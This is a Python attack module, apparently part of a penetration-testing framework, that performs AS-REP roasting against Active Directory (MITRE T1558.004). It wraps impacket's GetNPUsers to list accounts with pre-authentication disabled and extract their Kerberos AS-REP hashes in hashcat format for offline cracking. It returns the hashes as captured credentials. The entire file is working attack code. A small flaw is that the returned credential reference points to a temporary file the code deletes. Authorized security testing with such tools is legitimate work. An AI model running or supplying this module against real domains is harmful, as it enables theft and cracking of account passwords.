"""
ASREPRoasting module.

FR-ATK-05 | MITRE T1558.004
Enumerates accounts with DONT_REQ_PREAUTH flag and extracts AS-REP hashes.
Non-destructive: read-only LDAP + Kerberos AS-REQ.
"""

from __future__ import annotations

import os
import tempfile

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "AD-ASREP-001"
    mitre_technique = "T1558.004"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip    = parameters.get("dc_ip", target)
        domain   = parameters.get("domain", "")
        userlist = parameters.get("userlist", "")  # Path to username list

        if not domain:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "domain is required")

        with tempfile.NamedTemporaryFile(
            suffix=".txt", delete=False, mode="w"
        ) as tf:
            output_path = tf.name

        try:
            from impacket.examples import GetNPUsers  # type: ignore

            args = [
                f"{domain}/",
                "-dc-ip", dc_ip,
                "-no-pass",
                "-format", "hashcat",
                "-outputfile", output_path,
            ]
            if userlist and os.path.exists(userlist):
                args += ["-usersfile", userlist]

            GetNPUsers.main(args)

            if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
                with open(output_path) as f:
                    hashes = f.read()
                return AttackResult(
                    success=True,
                    outcome="SUCCESS",
                    gained_access=False,
                    access_level="none",
                    output=hashes[:2000],
                    credentials_captured=[
                        {
                            "type":   "asrep_hash",
                            "ref":    output_path,
                            "domain": domain,
                        }
                    ],
                )
            return AttackResult(False, "NO_ASREP_ACCOUNTS", False, "none",
                                "No accounts with pre-auth disabled found")

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
        finally:
            try:
                os.unlink(output_path)
            except OSError:
                pass
